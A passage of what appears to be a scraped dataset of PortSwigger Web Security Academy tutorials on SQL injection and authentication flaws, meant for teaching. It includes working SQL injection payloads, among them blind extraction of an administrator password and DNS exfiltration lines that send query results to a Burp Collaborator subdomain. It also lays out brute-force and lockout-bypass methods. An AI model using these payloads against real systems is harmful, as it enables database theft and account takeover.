`information_schema.tables` to list the tables in the database:\n\n`SELECT * FROM information_schema.tables`This returns output like the following:\n\n```\nTABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE\n=====================================================\nMyDatabase     dbo           Products    BASE TABLE\nMyDatabase     dbo           Users       BASE TABLE\nMyDatabase     dbo           Feedback    BASE TABLE\n```This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.\n\nYou can then query `information_schema.columns` to list the columns in individual tables:\n\n`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`This returns output like the following:\n\n```\nTABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE\n=================================================================\nMyDatabase     dbo           Users       UserId       int\nMyDatabase     dbo           Users       Username     varchar\nMyDatabase     dbo           Users       Password     varchar\n```This output shows the columns in the specified table and the data type of each column.\n\nLAB\n\nPRACTITIONER [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)\n\n### Listing the contents of an Oracle database\n\nOn Oracle, you can find the same information as follows:\n\n*   You can list tables by querying `all_tables`:\n    \n    `SELECT * FROM all_tables`\n    \n*   You can list columns by querying `all_tab_columns`:\n    \n    `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`\n    \n\nLAB\n\nPRACTITIONER [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)\n\nWant to track your progress and have a more personalized learning experience? (It's free!)\n\n[Sign up](https://portswigger.net/users/register) [Login](https://portswigger.net/users?returnurl=%2fweb-security%2fsql-injection%2fexamining-the-database)\n\n![Try Burp Suite for Free](/content/images/logos/burp-suite-icon.svg)\n\n#### Find SQL injection vulnerabilities using Burp Suite\n\n[Try for free](https://portswigger.net/burp)\n\nBurp Suite\n\n[Web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner) [Burp Suite Editions](https://portswigger.net/burp) [Release Notes](https://portswigger.net/burp/releases)\n\nVulnerabilities\n\n[Cross-site scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting) [SQL injection](https://portswigger.net/web-security/sql-injection) [Cross-site request forgery](https://portswigger.net/web-security/csrf) [XML external entity injection](https://portswigger.net/web-security/xxe) [Directory traversal](https://portswigger.net/web-security/file-path-traversal) [Server-side request forgery](https://portswigger.net/web-security/ssrf)\n\nCustomers\n\n[Organizations](https://portswigger.net/organizations) [Testers](https://portswigger.net/testers) [Developers](https://portswigger.net/developers)\n\nCompany\n\n[About](https://portswigger.net/about) [Careers](https://portswigger.net/careers) [Contact](https://portswigger.net/about/contact) [Legal](https://portswigger.net/legal) [Privacy Notice](https://portswigger.net/privacy)\n\nInsights\n\n[Web Security Academy](https://portswigger.net/web-security) [Blog](https://portswigger.net/blog) [Research](https://portswigger.net/research)\n\n[![PortSwigger Logo](/content/images/logos/portswigger-logo.svg)](https://portswigger.net/) [Follow us](https://twitter.com/Burp_Suite)\u00a9 2024 PortSwigger Ltd.\n\n[](https://portswigger.net/web-security/sql-injection/examining-the-database#top)\n", "category": "SQLi"}, {"title": "Blind SQL injection", "content": "### Exploiting blind SQL injection by triggering conditional errors\n\nSome applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in the previous section won't work, because injecting different boolean conditions makes no difference to the application's responses.\n\nIt's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.\n\nTo see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:\n\n```\nxyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a\nxyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a\n```\n\nThese inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true:\n\n*   With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.\n*   With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.\n\nIf the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.\n\nUsing this technique, you can retrieve data by testing one character at a time:\n\n`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`\n\n#### Note\n\nThere are different ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).\n\nMisconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an `id` parameter:\n\n`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`\n\nThis shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quoted string inside a `WHERE` statement. This makes it easier to construct a valid query containing a malicious payload. Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.\n\nYou can use the `CAST()` function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:\n\n`CAST((SELECT example_column FROM example_table) AS int)`\n\nOften, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an `int`, may cause an error similar to the following:\n\n`ERROR: invalid input syntax for type integer: \"Example data\"`\n\nThis type of query may also be useful if a character limit prevents you from triggering conditional responses.\n\nExploiting blind SQL injection by triggering time delays\n--------------------------------------------------------\n\nIf the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.\n\nIn this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.\n\nThe techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:\n\n```\n'; IF (1=2) WAITFOR DELAY '0:0:10'--\n'; IF (1=1) WAITFOR DELAY '0:0:10'--\n```\n\n*   The first of these inputs does not trigger a delay, because the condition `1=2` is false.\n*   The second input triggers a delay of 10 seconds, because the condition `1=1` is true.\n\nUsing this technique, we can retrieve data by testing one character at a time:\n\n`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`\n\n#### Note\n\nThere are various ways to trigger time delays within SQL queries, and different techniques apply on different types of database. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).\n\nExploiting blind SQL injection using out-of-band (OAST) techniques\n------------------------------------------------------------------\n\nAn application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.\n\nIn this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.\n\nA variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.\n\nThe easiest and most reliable tool for using out-of-band techniques is [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator). This is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. [Burp Suite Professional](https://portswigger.net/burp/pro) includes a built-in client that's configured to work with Burp Collaborator right out of the box. For more information, see the documentation for [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator).\n\nThe techniques for triggering a DNS query are specific to the type of database being used. For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:\n\n`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`\n\nThis causes the database to perform a lookup for the following domain:\n\n`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`\n\nYou can use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.\n\nHaving confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:\n\n`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree \"//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a\"')--`\n\nThis input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:\n\n`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`\n\nOut-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.\n\n#### Note\n\nThere are various ways of triggering out-of-band interactions, and different techniques apply on different types of database. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).\n\nHow to prevent blind SQL injection attacks?\n-------------------------------------------\n\nAlthough the techniques needed to find and exploit blind SQL injection vulnerabilities are different and more sophisticated than for regular SQL injection, the measures needed to prevent SQL injection are the same.\n\nAs with regular SQL injection, blind SQL injection attacks can be prevented through the careful use of parameterized queries, which ensure that user input cannot interfere with the structure of the intended SQL query.\n\n#### Read more\n\n*   [How to prevent SQL injection](https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection)\n*   [Find blind SQL injection vulnerabilities using Burp Suite's web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner)\n", "category": "SQLi"}, {"title": "SQL injection cheat sheet", "content": "#### Note\n\nWith MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.\n\nTime delays\n-----------\n\nYou can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.\n\nOracle\n\n```\n\n                    dbms_pipe.receive_message(('a'),10)\n                \n```\n\nMicrosoft\n\n```\n\n                    WAITFOR DELAY '0:0:10'\n                \n```\n\nPostgreSQL\n\n```\n\n                    SELECT pg_sleep(10)\n                \n```\n\nMySQL\n\n```\n\n                    SELECT SLEEP(10)\n                \n```\n\nConditional time delays\n-----------------------\n\nYou can test a single boolean condition and trigger a time delay if the condition is true.\n\nOracle\n\n```\n\n                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual\n                \n```\n\nMicrosoft\n\n```\n\n                    IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'\n                \n```\n\nPostgreSQL\n\n```\n\n                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END\n                \n```\n\nMySQL\n\n```\n\n                    SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')\n                \n```\n\nDNS lookup\n----------\n\nYou can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.\n\nOracle\n\n([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:\n\n`SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual`The following technique works on fully patched Oracle installations, but requires elevated privileges:\n\n`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`\n\nMicrosoft\n\n```\n\n                    exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'\n                \n```\n\nPostgreSQL\n\n```\n\n                    copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'\n                \n```\n\nMySQL\n\nThe following techniques work on Windows only:\n\n`LOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')`  \n`SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'`\n\nDNS lookup with data exfiltration\n---------------------------------\n\nYou can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.\n\nOracle\n\n```\n\n                    SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual\n                \n```\n\nMicrosoft\n\n```\n\n                    declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree \"//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a\"')\n                \n```\n\nPostgreSQL\n\n```\n\n                    create OR replace function f() returns void as $$  \n                    declare c text;  \n                    declare p text;  \n                    begin  \n                    SELECT into p (SELECT YOUR-QUERY-HERE);  \n                    c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';  \n                    execute c;  \n                    END;  \n                    $$ language plpgsql security definer;  \n                    SELECT f();\n                \n```\n\nMySQL\n\nThe following technique works on Windows only:  \n`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'`\n", "category": "SQLi"}, {"title": "What is Authentication?", "content": "Conceptually, authentication vulnerabilities are easy to understand. However, they are usually critical because of the clear relationship between authentication and security.\n\nAuthentication vulnerabilities can allow attackers to gain access to sensitive data and functionality. They also expose additional attack surface for further exploits. For this reason, it's important to learn how to identify and exploit authentication vulnerabilities, and how to bypass common protection measures.\n\nIn this section, we explain:\n\n*   The most common authentication mechanisms used by websites.\n*   Potential vulnerabilities in these mechanisms.\n*   Inherent vulnerabilities in different authentication mechanisms.\n*   Typical vulnerabilities that are introduced by their improper implementation.\n*   How you can make your own authentication mechanisms as robust as possible.\n\n!\n\nLabs\n----\n\nIf you're familiar with the basic concepts behind authentication vulnerabilities and want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access labs in this topic from the link below.\n\n*   [View all authentication labs](https://portswigger.net/web-security/all-labs#authentication)\n\nWhat is authentication?\n-----------------------\n\nAuthentication is the process of verifying the identity of a user or client. Websites are potentially exposed to anyone who is connected to the internet. This makes robust authentication mechanisms integral to effective web security.\n\nThere are three main types of authentication:\n\n*   Something you **know**, such as a password or the answer to a security question. These are sometimes called \"knowledge factors\".\n*   Something you **have**, This is a physical object such as a mobile phone or security token. These are sometimes called \"possession factors\".\n*   Something you **are** or do. For example, your biometrics or patterns of behavior. These are sometimes called \"inherence factors\".\n\nAuthentication mechanisms rely on a range of technologies to verify one or more of these factors.\n\nAuthentication is the process of verifying that a user is who they claim to be. Authorization involves verifying whether a user is allowed to do something.\n\nFor example, authentication determines whether someone attempting to access a website with the username `Carlos123` really is the same person who created the account.\n\nOnce `Carlos123` is authenticated, their permissions determine what they are authorized to do. For example, they may be authorized to access personal information about other users, or perform actions such as deleting another user's account.\n\nHow do authentication vulnerabilities arise?\n--------------------------------------------\n\nMost vulnerabilities in authentication mechanisms occur in one of two ways:\n\n*   The authentication mechanisms are weak because they fail to adequately protect against brute-force attacks.\n*   [Logic flaws](https://portswigger.net/web-security/logic-flaws) or poor coding in the implementation allow the authentication mechanisms to be bypassed entirely by an attacker. This is sometimes called \"broken authentication\".\n\nIn many areas of web development, logic flaws cause the website to behave unexpectedly, which may or may not be a security issue. However, as authentication is so critical to security, it's very likely that flawed authentication logic exposes the website to security issues.\n\nWhat is the impact of vulnerable authentication?\n------------------------------------------------\n\nThe impact of authentication vulnerabilities can be severe. If an attacker bypasses authentication or brute-forces their way into another user's account, they have access to all the data and functionality that the compromised account has. If they are able to compromise a high-privileged account, such as a system administrator, they could take full control over the entire application and potentially gain access to internal infrastructure.\n\nEven compromising a low-privileged account might still grant an attacker access to data that they otherwise shouldn't have, such as commercially sensitive business information. Even if the account does not have access to any sensitive data, it might still allow the attacker to access additional pages, which provide a further attack surface. Often, high-severity attacks are not possible from publicly accessible pages, but they may be possible from an internal page.\n\nVulnerabilities in authentication mechanisms\n--------------------------------------------\n\nA website's authentication system usually consists of several distinct mechanisms where vulnerabilities may occur. Some vulnerabilities are applicable across all of these contexts. Others are more specific to the functionality provided.\n\nWe will look more closely at some of the most common vulnerabilities in the following areas:\n\n*   [Vulnerabilities in password-based login](https://portswigger.net/web-security/authentication/password-based) LABS\n*   [Vulnerabilities in multi-factor authentication](https://portswigger.net/web-security/authentication/multi-factor) LABS\n*   [Vulnerabilities in other authentication mechanisms](https://portswigger.net/web-security/authentication/other-mechanisms) LABS\n\nSeveral of the labs require you to enumerate usernames and brute-force passwords. To help you with this process, we provide a shortlist of candidate [usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames) and [passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) that you should use to solve the labs.\n\n### Vulnerabilities in third-party authentication mechanisms\n\nIf you love to hack authentication mechanisms and you've completed our main authentication, you may want to try our OAuth authentication labs.\n\nPreventing attacks on your own authentication mechanisms\n--------------------------------------------------------\n\nWe have demonstrated several ways in which websites can be vulnerable due to how they implement authentication. To reduce the risk of such attacks on your own websites, there are several principles that you should always try to follow.\n", "category": "Authentication"}, {"title": "Vulnerabilities in password-based authentication", "content": "### Brute-forcing usernames\n\nUsernames are especially easy to guess if they conform to a recognizable pattern, such as an email address. For example, it is very common to see business logins in the format `firstname.lastname@somecompany.com`. However, even if there is no obvious pattern, sometimes even high-privileged accounts are created using predictable usernames, such as `admin` or `administrator`.\n\nDuring auditing, check whether the website discloses potential usernames publicly. For example, are you able to access user profiles without logging in? Even if the actual content of the profiles is hidden, the name used in the profile is sometimes the same as the login username. You should also check HTTP responses to see if any email addresses are disclosed. Occasionally, responses contain email addresses of high-privileged users, such as administrators or IT support.\n\n### Brute-forcing passwords\n\nPasswords can similarly be brute-forced, with the difficulty varying based on the strength of the password. Many websites adopt some form of password policy, which forces users to create high-entropy passwords that are, theoretically at least, harder to crack using brute-force alone. This typically involves enforcing passwords with:\n\n*   A minimum number of characters\n*   A mixture of lower and uppercase letters\n*   At least one special character\n\nHowever, while high-entropy passwords are difficult for computers alone to crack, we can use a basic knowledge of human behavior to exploit the vulnerabilities that users unwittingly introduce to this system. Rather than creating a strong password with a random combination of characters, users often take a password that they can remember and try to crowbar it into fitting the password policy. For example, if `mypassword` is not allowed, users may try something like `Mypassword1!` or `Myp4$$w0rd` instead.\n\nIn cases where the policy requires users to change their passwords on a regular basis, it is also common for users to just make minor, predictable changes to their preferred password. For example, `Mypassword1!` becomes `Mypassword1?` or `Mypassword2!.`\n\nThis knowledge of likely credentials and predictable patterns means that brute-force attacks can often be much more sophisticated, and therefore effective, than simply iterating through every possible combination of characters.\n\n### Username enumeration\n\nUsername enumeration is when an attacker is able to observe changes in the website's behavior in order to identify whether a given username is valid.\n\nUsername enumeration typically occurs either on the login page, for example, when you enter a valid username but an incorrect password, or on registration forms when you enter a username that is already taken. This greatly reduces the time and effort required to brute-force a login because the attacker is able to quickly generate a shortlist of valid usernames.\n\nWhile attempting to brute-force a login page, you should pay particular attention to any differences in:\n\n*   **Status codes**: During a brute-force attack, the returned HTTP status code is likely to be the same for the vast majority of guesses because most of them will be wrong. If a guess returns a different status code, this is a strong indication that the username was correct. It is best practice for websites to always return the same status code regardless of the outcome, but this practice is not always followed.\n*   **Error messages**: Sometimes the returned error message is different depending on whether both the username AND password are incorrect or only the password was incorrect. It is best practice for websites to use identical, generic messages in both cases, but small typing errors sometimes creep in. Just one character out of place makes the two messages distinct, even in cases where the character is not visible on the rendered page.\n*   **Response times**: If most of the requests were handled with a similar response time, any that deviate from this suggest that something different was happening behind the scenes. This is another indication that the guessed username might be correct. For example, a website might only check whether the password is correct if the username is valid. This extra step might cause a slight increase in the response time. This may be subtle, but an attacker can make this delay more obvious by entering an excessively long password that the website takes noticeably longer to handle.\n\nFlawed brute-force protection\n-----------------------------\n\nIt is highly likely that a brute-force attack will involve many failed guesses before the attacker successfully compromises an account. Logically, brute-force protection revolves around trying to make it as tricky as possible to automate the process and slow down the rate at which an attacker can attempt logins. The two most common ways of preventing brute-force attacks are:\n\n*   Locking the account that the remote user is trying to access if they make too many failed login attempts\n*   Blocking the remote user's IP address if they make too many login attempts in quick succession\n\nBoth approaches offer varying degrees of protection, but neither is invulnerable, especially if implemented using flawed logic.\n\nFor example, you might sometimes find that your IP is blocked if you fail to log in too many times. In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully. This means an attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached.\n\nIn this case, merely including your own login credentials at regular intervals throughout the wordlist is enough to render this defense virtually useless.\n\n### Account locking\n\nOne way in which websites try to prevent brute-forcing is to lock the account if certain suspicious criteria are met, usually a set number of failed login attempts. Just as with normal login errors, responses from the server indicating that an account is locked can also help an attacker to enumerate usernames.\n\nLocking an account offers a certain amount of protection against targeted brute-forcing of a specific account. However, this approach fails to adequately prevent brute-force attacks in which the attacker is just trying to gain access to any random account they can.\n\nFor example, the following method can be used to work around this kind of protection:\n\n1.  Establish a list of candidate usernames that are likely to be valid. This could be through username enumeration or simply based on a list of common usernames.\n2.  Decide on a very small shortlist of passwords that you think at least one user is likely to have. Crucially, the number of passwords you select must not exceed the number of login attempts allowed. For example, if you have worked out that limit is 3 attempts, you need to pick a maximum of 3 password guesses.\n3.  Using a tool such as Burp Intruder, try each of the selected passwords with each of the candidate usernames. This way, you can attempt to brute-force every account without triggering the account lock. You only need a single user to use one of the three passwords in order to compromise an account.\n\nAccount locking also fails to protect against credential stuffing attacks. This involves using a massive dictionary of `username:password` pairs, composed of genuine login credentials stolen in data breaches. Credential stuffing relies on the fact that many people reuse the same username and password on multiple websites and, therefore, there is a chance that some of the compromised credentials in the dictionary are also valid on the target website. Account locking does not protect against credential stuffing because each username is only being attempted once. Credential stuffing is particularly dangerous because it can sometimes result in the attacker compromising many different accounts with just a single automated attack.\n\n### User rate limiting\n\nAnother way websites try to prevent brute-force attacks is through user rate limiting. In this case, making too many login requests within a short period of time causes your IP address to be blocked. Typically, the IP can only be unblocked in one of the following ways:\n\n*   Automatically after a certain period of time has elapsed\n*   Manually by an administrator\n*   Manually by the user after successfully completing a CAPTCHA\n\nUser rate limiting is sometimes preferred to account locking due to being less prone to username enumeration and denial of service attacks. However, it is still not completely secure. As we saw an example of in an earlier lab, there are several ways an attacker can manipulate their apparent IP in order to bypass the block.\n\nAs the limit is based on the rate of HTTP requests sent from the user's IP address, it is sometimes also possible to bypass this defense if you can work out how to guess multiple passwords with a single request.\n\nHTTP basic authentication\n-------------------------\n\nAlthough fairly old, its relative simplicity and ease of implementation means you might sometimes see HTTP basic authentication being used. In HTTP basic authentication, the client receives an authentication token from the server, which is constructed by concatenating the username and password, and encoding it in Base64. This token is stored and managed by the browser, which automatically adds it to the `Authorization` header of every subsequent request as follows:\n\n`Authorization: Basic base64(username:password)`\n\nFor a number of reasons, this is generally not considered a secure authentication method. Firstly, it involves repeatedly sending the user's login credentials with every request. Unless the website also implements HSTS, user credentials are open to being captured in a man-in-the-middle attack.\n\nIn addition, implementations of HTTP basic authentication often don't support brute-force protection. As the token consists exclusively of static values, this can leave it vulnerable to being brute-forced.\n\nHTTP basic authentication is also particularly vulnerable to session-related exploits, notably [CSRF](https://portswigger.net/web-security/csrf), against which it offers no protection on its own.\n\nIn some cases, exploiting vulnerable HTTP basic authentication might only grant an attacker access to a seemingly uninteresting page. However, in addition to providing a further attack surface, the credentials exposed in this way might be reused in other, more confidential contexts.\n", "category": "Authentication"}, {"title": "Vulnerabilities in other authentication mechanisms", "content": "### Sending passwords by email\n\nIt should go without saying that sending users their current password should never be possible if a website handles passwords securely in the first place. Instead, some websites generate a new password and send this to the user via email.\n\nGenerally speaking, sending persistent passwords over insecure channels is to be avoided. In this case, the security relies on either the generated password expiring after a very short period, or the user changing their password again immediately. Otherwise, this approach is highly susceptible to man-in-the-middle attacks.\n\nEmail is also generally not considered secure given that inboxes are both persistent and not really designed for secure storage of confidential information. Many users also automatically sync their inbox between multiple devices across insecure channels.\n\n### Resetting passwords using a URL\n\nA more robust method of resetting passwords is to send a unique URL to users that takes them to a password reset page. Less secure implementations of this method use a URL with an easily guessable parameter to identify which account is being reset, for example:\n\n`http://vulnerable-website.com/reset-password?user=victim-user`\n\nIn this example, an attacker could change the `user` parameter to refer to any username they have identified. They would then be taken straight to a page where they can potentially set a new password for this arbitrary user.\n\nA better implementation of this process is to generate a high-entropy, hard-to-guess token and create the reset URL based on that. In the best case scenario, this URL should provide no hints about which user's password is being reset.\n\n`http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8`\n\nWhen the user visits this URL, the system should check whether this token exists on the back-end and, if so, which user's password it is supposed to reset. This token should expire after a short period of time and be destroyed immediately after the password has been reset.\n\nHowever, some websites fail to also validate the token again when the reset form is submitted. In this case, an attacker could simply visit the reset form from their own account, delete the token, and leverage this page to reset an arbitrary user's password.\n\nIf the URL in the reset email is generated dynamically, this may also be vulnerable to password reset poisoning. In this case, an attacker can potentially steal another user's token and use it change their password.\n\nChanging user passwords\n-----------------------\n\nTypically, changing your password involves entering your current password and then the new password twice. These pages fundamentally rely on the same process for checking that usernames and current passwords match as a normal login page does. Therefore, these pages can be vulnerable to the same techniques.\n\nPassword change functionality can be particularly dangerous if it allows an attacker to access it directly without being logged in as the victim user. For example, if the username is provided in a hidden field, an attacker might be able to edit this value in the request to target arbitrary users. This can potentially be exploited to enumerate usernames and brute-force passwords.\n", "category": "Authentication"}, {"title": "Securing your authentication mechanisms", "content": "### Authentication vulnerabilities\n\n*    [What is authentication?](https://portswigger.net/web-security/authentication#what-is-authentication)\n    *   [Authentication vs authorization](https://portswigger.net/web-security/authentication#what-is-the-difference-between-authentication-and-authorization)\n*   [How vulnerabilities arise](https://portswigger.net/web-security/authentication#how-do-authentication-vulnerabilities-arise)\n*   [Impact of vulnerable authentication](https://portswigger.net/web-security/authentication#what-is-the-impact-of-vulnerable-authentication)\n*    [Vulnerabilities in password-based authentication](https://portswigger.net/web-security/authentication/password-based)\n    *    [Brute-force attacks](https://portswigger.net/web-security/authentication/password-based#brute-force-attacks)\n        *   [Brute-forcing usernames](https://portswigger.net/web-security/authentication/password-based#brute-forcing-usernames)\n        *   [Brute-forcing passwords](https://portswigger.net/web-security/authentication/password-based#brute-forcing-passwords)\n        *   [Enumerating usernames](https://portswigger.net/web-security/authentication/password-based#username-enumeration)\n        *    [Flaws in brute-force protection](https://portswigger.net/web-security/authentication/password-based#flawed-brute-force-protection)\n            *   [Account locking](https://portswigger.net/web-security/authentication/password-based#account-locking)\n            *   [User rate limiting](https://portswigger.net/web-security/authentication/password-based#user-rate-limiting)\n    *   [Exploiting HTTP basic authentication](https://portswigger.net/web-security/authentication/password-based#http-basic-authentication)\n*    [Vulnerabilities in multi-factor authentication](https://portswigger.net/web-security/authentication/multi-factor)\n    *   [Two-factor authentication tokens](https://portswigger.net/web-security/authentication/multi-factor#two-factor-authentication-tokens)\n    *   [Bypassing two-factor authentication](https://portswigger.net/web-security/authentication/multi-factor#bypassing-two-factor-authentication)\n    *   [Bypassing two-factor authentication with flawed verification](https://portswigger.net/web-security/authentication/multi-factor#flawed-two-factor-verification-logic)\n    *   [Brute-forcing two-factor authentication codes](https://portswigger.net/web-security/authentication/multi-factor#brute-forcing-2fa-verification-codes)\n*    [Vulnerabilities in other authentication mechanisms](https://portswigger.net/web-security/authentication/other-mechanisms)\n    *   [Keeping users logged in](https://portswigger.net/web-security/authentication/other-mechanisms#keeping-users-logged-in)\n    *    [Resetting user passwords](https://portswigger.net/web-security/authentication/other-mechanisms#resetting-user-passwords)\n        *   [Sending passwords by email](https://portswigger.net/web-security/authentication/other-mechanisms#sending-passwords-by-email)\n        *   [Resetting passwords using a URL](https://portswigger.net/web-security/authentication/other-mechanisms#resetting-passwords-using-a-url)\n    *   [Changing user passwords](https://portswigger.net/web-security/authentication/other-mechanisms#changing-user-passwords)\n*   [Vulnerabilities in OAuth authentication](https://portswigger.net/web-security/authentication#vulnerabilities-in-third-party-authentication-mechanisms)\n*   [Securing your authentication mechanisms](https://portswigger.net/web-security/authentication/securing)\n*   [View all authentication labs](https://portswigger.net/web-security/all-labs#authentication)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [Authentication vulnerabilities](https://portswigger.net/web-security/authentication)\n*   [Securing](https://portswigger.net/web-security/authentication/securing)\n\nHow to secure your authentication mechanisms\n============================================\n\nIn this section, we'll talk about how you can prevent some of the vulnerabilities we've discussed from occurring in your authentication mechanisms.\n\nAuthentication is a complex topic and, as we have demonstrated, it is unfortunately all too easy for weaknesses and flaws to creep in. Outlining every possible measure you can take to protect your own websites is clearly not possible. However, there are several general principles that you should always follow.\n\nTake care with user credentials\n-------------------------------\n\nEven the most robust authentication mechanisms are ineffective if you unwittingly disclose a valid set of login credentials to an attacker. It should go without saying that you should never send any login data over unencrypted connections. 